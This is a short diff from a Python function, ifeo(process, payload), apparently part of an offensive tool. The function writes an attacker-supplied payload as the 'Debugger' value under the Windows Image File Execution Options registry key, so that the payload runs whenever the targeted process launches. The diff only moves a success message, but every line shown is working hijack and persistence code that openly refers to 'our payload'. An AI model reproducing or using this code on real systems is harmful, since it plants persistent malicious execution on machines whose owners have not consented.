@@ -26,11 +26,12 @@ def ifeo(process,payload):
 		try:
 			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process))
 			_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,payload)
-			_winreg.CloseKey(key)
-			print_success("Successfully created Debugger registry key containing our payload")
+			_winreg.CloseKey(key)		
 		except Exception as error:
 			print_error("Unable to create Debugger registry key, exception was raised")
 			return False
+		else:
+			print_success("Successfully created Debugger registry key containing our payload")
 	else:
 		print_error("Unable to create Debugger registry key, we are not elevated")
 		return False
